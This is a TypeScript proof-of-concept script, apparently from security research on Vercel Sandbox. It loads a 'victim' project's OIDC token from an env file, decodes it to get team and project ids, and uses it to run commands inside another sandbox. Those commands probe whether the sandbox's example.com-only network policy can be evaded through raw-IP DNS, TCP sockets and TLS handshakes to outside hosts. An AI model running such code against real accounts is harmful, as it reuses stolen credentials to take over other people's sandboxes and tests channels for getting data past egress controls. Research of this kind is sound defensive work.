import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", `
set +e
echo "=== A. raw TCP DNS query to 8.8.8.8:53 (non-allowed IP) ==="
timeout 5 dig +tcp @8.8.8.8 example.com +time=3 +tries=1 2>&1 | grep -aE "status|ANSWER|Query time|rcvd" | head -4
echo "=== B. raw UDP DNS to 8.8.8.8:53 (non-allowed) ==="
timeout 5 dig @8.8.8.8 example.com +time=3 +tries=1 +notcp 2>&1 | grep -aE "status|ANSWER|Query time|rcvd" | head -4
echo "=== C. raw TCP connect + send/receive data to 1.1.1.1:80 (echo test) ==="
timeout 4 python3 - << 'PYEOF' 2>&1 | head -8
import socket, time
try:
    s = socket.create_connection(("1.1.1.1", 80), timeout=3)
    s.sendall(b"GET / HTTP/1.1\r\nHost: one.one.one.one\r\nConnection: close\r\n\r\n")
    s.settimeout(3)
    data = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk: break
            data += chunk
    except socket.timeout:
        pass
    print("RECEIVED bytes:", len(data))
    print(data[:120])
except Exception as e:
    print("ERROR:", e)
PYEOF
echo "=== D. raw TCP connect + data to 8.8.8.8:53 with DNS query ==="
timeout 5 python3 - << 'PYEOF' 2>&1 | head -6
import socket, struct
q = bytes.fromhex("abcd0100000100000000000000076578616d706c6503636f6d0000010001")
try:
    s = socket.create_connection(("8.8.8.8", 53), timeout=3)
    s.sendall(q)
    s.settimeout(3)
    data = s.recv(4096)
    print("TCP DNS RESPONSE bytes:", len(data), "->", "ANSWER (has answers)" if len(data)>20 else "no answer (filtered)")
except Exception as e:
    print("ERROR:", e)
PYEOF
echo "=== E. can we reach an HTTP service via raw IP + custom port (e.g., cloudflare 104.16.x:443 TLS handshake) ==="
timeout 5 openssl s_client -connect 104.16.132.229:443 -servername example.com -brief 2>&1 | head -4
echo "=== F. verify policy still example.com-only ==="
echo DONE
`], { wait: true, timeout: 90_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });
